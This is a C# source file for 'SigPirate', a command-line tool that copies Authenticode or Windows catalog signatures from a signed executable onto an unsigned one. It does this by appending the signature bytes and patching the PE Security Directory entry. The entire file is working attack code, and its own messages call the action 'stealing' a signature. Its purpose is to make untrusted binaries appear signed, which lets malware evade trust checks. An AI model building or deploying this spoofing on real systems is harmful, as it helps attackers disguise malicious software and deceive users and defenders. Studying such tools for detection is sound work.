using System;
using System.Collections.Generic;
using NDesk.Options;
using System.IO;
using System.Runtime.InteropServices;
using System.ComponentModel;
using System.Text;

/// <summary>
/// Author: Chris Ross @xorrior
/// License: BSD3-Clause
/// Purpose: Clone Authenticode or Catalog signatures from one binary to an unsigned binary
/// </summary>

namespace SigPirate
{
    public class Program
    {
        //variables for command line args
        private static string fromFile;
        private static string destinationFile;
        private static string output;
        private static bool authenticodeTheft;
        private static bool help = false;

        public static void Main(string[] args)
        {
            OptionSet opts = new OptionSet()
            {
                {"s=|source=","Target file to copy the cert from", (string v) =>  fromFile = v},
                {"d=|destination=","Destination file to copy the cert to", (string v) => destinationFile = v },
                {"o=|output=", "Path for the signed file", (string v) => output = v },
                {"a|authenticode", "Copy the authenticode signature from the source binary. By default, the catalog signature (if it exists) will be copied.", v => authenticodeTheft = v != null },
                {"help", "Show the help menu", v => help = v != null }
            };

            try
            {
                opts.Parse(args);
            }
            catch (OptionException e)
            {
                Console.WriteLine(e.ToString());
                PrintHelp(opts);
            }

            if (destinationFile == null || fromFile == null || output == null || help == true)
            {
                PrintHelp(opts);
                System.Environment.Exit(-1);
            }

            if (!File.Exists(destinationFile) || !File.Exists(fromFile))
                System.Environment.Exit(-1);

            //Get the File offset for the Security Directory entry.
            try
            {
                srcBytes = File.ReadAllBytes(fromFile);
                destBytes = File.ReadAllBytes(destinationFile);
            }
            catch (Exception e)
            {
                Console.WriteLine("Unable to read files: " + e.ToString());
                System.Environment.Exit(-1);
            }

            //If we are just getting the authenticode signature
            if (authenticodeTheft)
            {
#if DEBUG
                Console.WriteLine("[+] Stealing authenticode signature...");
#endif
                try
                {
#if DEBUG 
                    Console.WriteLine("[+] Parsing source PE for SecurityDirectory entry");
#endif
                    GetSecurityDirectoryInfo(srcBytes, true);
                    KeyValuePair<bool,string> result = CopyAuthenticodeSignature();
                    if (result.Key)
                        File.WriteAllBytes(output, signedPE);
                    else
                        Console.WriteLine("[-] Failed copy authenticode signature.");
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.ToString());
                }
            }
            else
            {
                //Otherwise try to copy the Calatog signature
                KeyValuePair<bool, string> result = CheckForCatalog();
                if(!result.Key)
                {
                    Console.WriteLine("[+] " + result.Value);
                    System.Environment.Exit(0);
                }

                result = CopyCatalogSignature(result.Value);
                if (result.Key)
                {
                    File.WriteAllBytes(output, signedPE);
                    Console.WriteLine(result.Value);
                }
                else
                    Console.WriteLine("[-] Failed to copy catalog signature: " + result.Value);

            }
        }

        private static unsafe KeyValuePair<bool, string> CheckForCatalog()
        {
            //Obtain a file handle to the source file
            FileStream fs = null;
            try
            {
                fs = new FileStream(fromFile, FileMode.Open, FileAccess.Read);
            }
            catch (Exception e)
            {
                return new KeyValuePair<bool, string>(false, e.ToString());
            }
            
            IntPtr fHandle = fs.SafeFileHandle.DangerousGetHandle();
            IntPtr hCatInfo = new IntPtr();
            IntPtr hCatAdminSha256 = new IntPtr();
            IntPtr hCatAdminSha1 = new IntPtr();
            int lastError = 0;
            Dictionary<string, object> hash256 = new Dictionary<string, object>();
            Dictionary<string, object> hash1 = new Dictionary<string, object>();
            bool success = false;
            //Get the catalog context

            GCHandle drvActionVerifyGC = GCHandle.Alloc(DRIVER_ACTION_VERIFY.ToByteArray(), GCHandleType.Pinned);
            IntPtr drvActionVerifyPtr = drvActionVerifyGC.AddrOfPinnedObject();

            try
            {
                //Call Acquire context for SHA256 and SHA1
                success = CryptCATAdminAcquireContext2(ref hCatAdminSha256, drvActionVerifyPtr, "SHA256", IntPtr.Zero, 0);
                if (!success)
                    return new KeyValuePair<bool, string>(false, new Win32Exception(Marshal.GetLastWin32Error()).Message);

                success = CryptCATAdminAcquireContext2(ref hCatAdminSha1, drvActionVerifyPtr, "SHA1", IntPtr.Zero, 0);
                if (!success)
                    return new KeyValuePair<bool, string>(false, new Win32Exception(Marshal.GetLastWin32Error()).Message);

                hash256 = HashFromFile2(hCatAdminSha256, fHandle);
                if (hash256.Count == 0)
                    return new KeyValuePair<bool, string>(false, "[-] Unable to calc sha256 file hash");

                hash1 = HashFromFile2(hCatAdminSha1, fHandle);
                if (hash1.Count == 0)
                    return new KeyValuePair<bool, string>(false, "[-] Unable to calc sha1 file hash");

                IntPtr prev = IntPtr.Zero;
                hCatInfo = CryptCATAdminEnumCatalogFromHash(hCatAdminSha256, (byte[])hash256["HashBytes"], (uint)hash256["HashLength"], 0, prev);
                
                if(hCatInfo == IntPtr.Zero)
                {
                    CryptCATAdminReleaseContext(hCatAdminSha256, 0);
                    hCatInfo = CryptCATAdminEnumCatalogFromHash(hCatAdminSha1, (byte[])hash1["HashBytes"], (uint)hash1["HashLength"], 0, prev);
                    hCatAdminSha256 = IntPtr.Zero;
                }
                else
                {
                    hCatAdminSha1 = IntPtr.Zero;
                }
            }
            catch (Exception)
            {
                success = CryptCATAdminAcquireContext(out hCatAdminSha1, DRIVER_ACTION_VERIFY, 0);
                lastError = Marshal.GetLastWin32Error();
                if (!success)
                    return new KeyValuePair<bool, string>(false, new Win32Exception(lastError).Message);

                Dictionary<string, object> hash = HashFromFile(hCatAdminSha1, fHandle);
                if (hash.Count == 0)
                    return new KeyValuePair<bool, string>(false, "[-] Unable to calculate SHA1 hash for file.");

                IntPtr prev = IntPtr.Zero;
                hCatInfo = CryptCATAdminEnumCatalogFromHash(hCatAdminSha1, (byte[])hash["HashBytes"], (uint)hash["HashLength"], 0, prev);
            }

            if (hCatInfo == IntPtr.Zero)
                return new KeyValuePair<bool, string>(false, "[-] Unable to find catalog hash for the given file");

            CATALOG_INFO cInfo = new CATALOG_INFO();
            cInfo.cbStruct = (uint)Marshal.SizeOf(typeof(CATALOG_INFO));

            try
            {
                success = CryptCATCatalogInfoFromContext(hCatInfo, ref cInfo, 0);
            }
            catch (Exception e)
            {
                lastError = Marshal.GetLastWin32Error();
                Console.WriteLine(new Win32Exception(lastError).Message);
                return new KeyValuePair<bool, string>(false, e.ToString());
            }

            if (!success)
                return new KeyValuePair<bool, string>(false, new Win32Exception(lastError).Message);

            return new KeyValuePair<bool, string>(true, cInfo.wszCatalogFile);
        }

        private static unsafe KeyValuePair<bool, string> CopyCatalogSignature(string catalogFilepath)
        {
            //Function for copying the catalog signature to the target file
            //Manually craft the CATALOG_INFO structure

            byte[] rawSig = File.ReadAllBytes(catalogFilepath);
            int length = 8 + rawSig.Length;

            signedPE = new byte[destBytes.Length + length];

            //copy the original PE
            Buffer.BlockCopy(destBytes, 0, signedPE, 0, destBytes.Length);

            //copy the size
            offset = destBytes.Length;
            byte[] dwLength = BitConverter.GetBytes(length);
            Buffer.BlockCopy(dwLength, 0, signedPE, destBytes.Length, dwLength.Length);

            //copy wRevision
            byte[] wRevision = BitConverter.GetBytes((short)0x0200);
            Buffer.BlockCopy(wRevision, 0, signedPE, (destBytes.Length + dwLength.Length), wRevision.Length);

            //copy wCertificateType
            byte[] wCertificateType = BitConverter.GetBytes((short)0x0002);
            Buffer.BlockCopy(wCertificateType, 0, signedPE, (destBytes.Length + dwLength.Length + wRevision.Length), wCertificateType.Length);

            //copy bCertificate
            Buffer.BlockCopy(rawSig, 0, signedPE, (destBytes.Length + dwLength.Length + wRevision.Length + wCertificateType.Length), rawSig.Length);

            rawSignature = new byte[length];

            UpdateSecurityDirectoryEntry();

            return new KeyValuePair<bool, string>(true, "[+] Successfully copied catalog signature to target binary");
        }

        private static unsafe KeyValuePair<bool, string> CopyAuthenticodeSignature()
        {
            //Function for copying the raw data for the authenticode signature
            //Copy the raw bytes for the signature to the destination/target PE.
            if (cert.bCertificate.Length == 0)
                return new KeyValuePair<bool, string>(false, "Source PE bCertificate field is empty");

            rawSignature = new byte[cert.dwLength];
            Buffer.BlockCopy(srcBytes, (int)secDirRVA, rawSignature, 0, rawSignature.Length);

            signedPE = new byte[destBytes.Length + rawSignature.Length];
            Buffer.BlockCopy(destBytes, 0, signedPE, 0, destBytes.Length);
            //record the offset for the signature
            offset = destBytes.Length;
            Buffer.BlockCopy(rawSignature, 0, signedPE, destBytes.Length, rawSignature.Length);

            //Update the Security Directory entry
            Console.WriteLine("[+] Parsing target/destination PE");
            GetSecurityDirectoryInfo(signedPE, false);

            UpdateSecurityDirectoryEntry();
            
            
            return new KeyValuePair<bool, string>(true, "[+] Successfully copied authenticode signature to target PE");
        }

        private static unsafe void UpdateSecurityDirectoryEntry()
        {
#if DEBUG
            Console.WriteLine("[+] Updating target PE....");
#endif

            fixed(byte* buffer = signedPE)
            {
                uint e_lfanew = *((uint*)(buffer + 60));
                pe_header = (buffer + e_lfanew);
                numberOfSections = *((ushort*)(pe_header + 6));
                ushort machineType = *((ushort*)(pe_header + 4));

                //if everything checks out, continue
                //jmp to the offset for Magic
                byte* magic = (pe_header + 24);
                short magic_val = *((short*)magic);

                if (magic_val == 267) /*x86*/
                {
                    is64 = false;
                }
                else if (magic_val == 523) /*x64*/
                {
                    is64 = true;
                }

                optional_hdr = (pe_header + 24);

                //Get the RVA and Size for the SECURITY_DIRECTORY
                if (is64)
                {
                    byte* secDir = (optional_hdr + 144);
                    byte[] bOffset = BitConverter.GetBytes(offset);
                    Marshal.Copy(bOffset, 0, (IntPtr)secDir, bOffset.Length);

                    byte[] bSize = BitConverter.GetBytes(rawSignature.Length);
                    Marshal.Copy(bSize, 0, (IntPtr)(secDir + 4), bSize.Length);

                    secDirRVA = *((uint*)(optional_hdr + 144));
                    secDirSize = *((uint*)(optional_hdr + 148));
#if DEBUG 
                    Console.WriteLine("Updated Security Directory Entry VA: " + secDirRVA.ToString("X8"));
                    Console.WriteLine("Updated Security Directory Entry Size: " + secDirSize.ToString("X8"));
#endif
                }
                else
                {

                    byte* secDir = (optional_hdr + 128);
                    byte[] bOffset = BitConverter.GetBytes(offset);
                    Marshal.Copy(bOffset, 0, (IntPtr)secDir, bOffset.Length);

                    byte[] bSize = BitConverter.GetBytes(rawSignature.Length);
                    Marshal.Copy(bSize, 0, (IntPtr)(secDir + 4), bSize.Length);

                    secDirRVA = *((uint*)(optional_hdr + 128));
                    secDirSize = *((uint*)(optional_hdr + 132));
#if DEBUG
                    Console.WriteLine("Updated Security Directory Entry VA: " + secDirRVA.ToString("X8"));
                    Console.WriteLine("Updated Security Directory Entry Size: " + secDirSize.ToString("X8"));
#endif
                }
            }
        }

        private static unsafe void GetSecurityDirectoryInfo(byte[] pe, bool source)
        {
            
            fixed (byte* buffer = pe)
            {
                uint e_lfanew = *((uint*)(buffer + 60));
                pe_header = (buffer + e_lfanew);
                numberOfSections = *((ushort*)(pe_header + 6));
                ushort machineType = *((ushort*)(pe_header + 4));

                //if everything checks out, continue
                //jmp to the offset for Magic
                byte* magic = (pe_header + 24);
                short magic_val = *((short*)magic);

                if (magic_val == 267) /*x86*/
                {
                    is64 = false;
                }
                else if (magic_val == 523) /*x64*/
                {
                    is64 = true;
                }

                optional_hdr = (pe_header + 24);

                
                //Get the RVA and Size for the SECURITY_DIRECTORY
                if (is64)
                {
                    secDirRVA = *((uint*)(optional_hdr + 144));
                    secDirSize = *((uint*)(optional_hdr + 148));
#if DEBUG 
                    Console.WriteLine("Security Directory Entry VA: " + secDirRVA.ToString("X8"));
                    Console.WriteLine("Security Directory Entry Size: " + secDirSize.ToString("X8"));
#endif
                }
                else
                {
                    secDirRVA = *((uint*)(optional_hdr + 128));
                    secDirSize = *((uint*)(optional_hdr + 132));
#if DEBUG
                    Console.WriteLine("Security Directory Entry VA: " + secDirRVA.ToString("X8"));
                    Console.WriteLine("Security Directory Entry Size: " + secDirSize.ToString("X8"));
#endif
                }

                if (source)
                {
                    //Manually fill out the WIN_CERTIFICATE struct
                    byte* securityDirEntry = (buffer + secDirRVA);
                    cert.dwLength = *((int*)(securityDirEntry));
                    cert.wRevision = *((short*)(securityDirEntry + 4));
                    cert.wCertificateType = *((short*)(securityDirEntry + 6));

                    try
                    {
                        cert.bCertificate = new byte[cert.dwLength - 8];
                        Marshal.Copy((IntPtr)(securityDirEntry + 8), cert.bCertificate, 0, cert.bCertificate.Length);
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine("Could not fill bCertificate field of WIN_CERTIFICATE structure: " + e.ToString());
                    }
                }
                
            }

            Console.WriteLine("[+] Parsed PE for Security Directory Entry");

        }

        private static Dictionary<string, object> HashFromFile(IntPtr catHandle, IntPtr fileHandle)
        {
            uint HashLength = 0;
            IntPtr empty = IntPtr.Zero;
            bool success = CryptCATAdminCalcHashFromFileHandle(fileHandle, ref HashLength, empty, 0);
            int lastError = Marshal.GetLastWin32Error();

            if(!success && lastError != 203)
            {
                Console.WriteLine("[-] Unable to calculate SHA1 hash " + new Win32Exception(lastError).Message);
                return new Dictionary<string, object>();
            }

            IntPtr hashBytesPtr = Marshal.AllocHGlobal((int)HashLength);
            byte[] hashBytes = new byte[HashLength];

            success = CryptCATAdminCalcHashFromFileHandle(fileHandle, ref HashLength, hashBytesPtr, 0);
            lastError = Marshal.GetLastWin32Error();
            if (!success)
            {
                Console.WriteLine("[-] Unable to calculate SHA1 hash " + new Win32Exception(lastError).Message);
                return new Dictionary<string, object>();
            }

            Marshal.Copy(hashBytesPtr, hashBytes, 0, hashBytes.Length);

            StringBuilder memberTag = new StringBuilder();
            for (int i = 0; i < HashLength; i++)
            {
                memberTag.AppendFormat("{0:X2}", hashBytes[i]);
            }

            Dictionary<string, object> res = new Dictionary<string, object>();
            res.Add("HashBytes", hashBytes);
            res.Add("HashLength", HashLength);
            res.Add("MemberTag", memberTag.ToString());

            return res;
        }

        private static Dictionary<string, object> HashFromFile2(IntPtr catHandle, IntPtr fileHandle)
        {
            uint hashLength = 0;
            IntPtr empty = IntPtr.Zero;

            bool success = CryptCATAdminCalcHashFromFileHandle2(catHandle, fileHandle, ref hashLength, empty, 0);
            int lastError = Marshal.GetLastWin32Error();
            if(!success && (lastError != 203))
            {
                return new Dictionary<string, object>();
            }

            IntPtr hashBytesPtr = Marshal.AllocHGlobal((int)hashLength);
            byte[] hashBytes = new byte[hashLength];

            success = CryptCATAdminCalcHashFromFileHandle2(catHandle, fileHandle, ref hashLength, hashBytesPtr, 0);
            lastError = Marshal.GetLastWin32Error();

            if(!success)
            {
                Console.WriteLine("[-] Could not calculate hash from file handle " + new Win32Exception(lastError).Message);
                return new Dictionary<string, object>();
            }


            Marshal.Copy(hashBytesPtr, hashBytes, 0, hashBytes.Length);


            StringBuilder memberTag = new StringBuilder();
            for (int i = 0; i < hashLength; i++)
            {
                memberTag.AppendFormat("{0:X2}", hashBytes[i]);
            }

            Dictionary<string, object> res = new Dictionary<string, object>();
            res.Add("HashBytes", hashBytes);
            res.Add("HashLength", hashLength);
            res.Add("MemberTag", memberTag.ToString());

            return res;
        }

        

        private static void PrintHelp(OptionSet o)
        {
            Console.Error.WriteLine("Usage: CertClone [options]");
            Console.Error.WriteLine("Options");
            o.WriteOptionDescriptions(Console.Error);
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public unsafe struct CATALOG_INFO
        {
            public UInt32 cbStruct;

            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
            public string wszCatalogFile;
        }

        [StructLayout(LayoutKind.Explicit)]
        public unsafe struct _WIN_CERTIFICATE
        {
            [FieldOffset(0)]
            public int dwLength;

            [FieldOffset(4)]
            public short wRevision;

            [FieldOffset(6)]
            public short wCertificateType;

            [FieldOffset(8)]
            public byte[] bCertificate;
        }

        [StructLayout(LayoutKind.Explicit)]
        private unsafe struct IMAGE_SECTION_HEADER
        {
            [FieldOffset(0)]
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public char[] Name;

            [FieldOffset(8)]
            public UInt32 VirtualSize;

            [FieldOffset(12)]
            public UInt32 VirtualAddress;

            [FieldOffset(16)]
            public UInt32 SizeOfRawData;

            [FieldOffset(20)]
            public UInt32 PointerToRawData;

            [FieldOffset(24)]
            public UInt32 PointerToRelocations;

            [FieldOffset(28)]
            public UInt32 PointerToLinenumbers;

            [FieldOffset(32)]
            public UInt16 NumberOfRelocations;

            [FieldOffset(34)]
            public UInt16 NumberOfLinenumbers;

            [FieldOffset(36)]
            public UInt16 Characteristics;
        }


        [DllImport("wintrust.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool CryptCATAdminReleaseContext(
            IntPtr hCatAdmin,
            UInt32 dwFlags);

        [DllImport("wintrust.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern bool CryptCATAdminAcquireContext2(
          ref IntPtr phCatAdmin,
          IntPtr pgSubsystem,
          [MarshalAs(UnmanagedType.LPWStr)]
          string pwszHashAlgorithm,
          IntPtr pStrongHashPolicy,
          Int32 dwFlags
        );

        [DllImport("wintrust.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool CryptCATAdminAcquireContext(
            [Out] out IntPtr CatAdminHandle,
            [In] [MarshalAs(UnmanagedType.LPStruct)] Guid Subsystem,
            [In] int Flags
        );

        [DllImport("wintrust.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool CryptCATAdminCalcHashFromFileHandle(
            IntPtr hFile,
            ref UInt32 pcbHash,
            IntPtr pbHash,
            UInt32 flags);

        [DllImport("wintrust.dll", SetLastError = true)]
        private static extern IntPtr CryptCATAdminEnumCatalogFromHash(
            IntPtr hCatAdmin,
            byte[] pbHash,
            UInt32 cbHash,
            UInt32 dwFlags,
            IntPtr phPrevCatInfo);

        [DllImport("wintrust.dll", SetLastError = true)]
        private static extern bool CryptCATCatalogInfoFromContext(
            IntPtr hCatInfo, 
            ref CATALOG_INFO psCatInfo, 
            UInt32 dwFlags);

        [DllImport("wintrust.dll", SetLastError = true)]
        private static extern bool CryptCATAdminCalcHashFromFileHandle2(
            IntPtr hCatAdmin, 
            IntPtr hFile, 
            ref UInt32 pcbHash, 
            IntPtr pbHash, 
            UInt32 dwFlags);

        //Class variables
        private static bool is64 = false;
        private static _WIN_CERTIFICATE cert = new _WIN_CERTIFICATE();
        private static unsafe byte* pe_header = null;
        private static unsafe byte* optional_hdr = null;
        private static uint secDirSize = 0;
        private static uint secDirRVA = 0;
        private static ushort numberOfSections;
        private static int offset = 0;
        private static byte[] srcBytes = null;
        private static byte[] destBytes = null;
        private static byte[] signedPE = null;
        private static byte[] rawSignature = null;

        private static Guid DRIVER_ACTION_VERIFY = new Guid("F750E6C3-38EE-11d1-85E5-00C04FC295EE");
    }
}
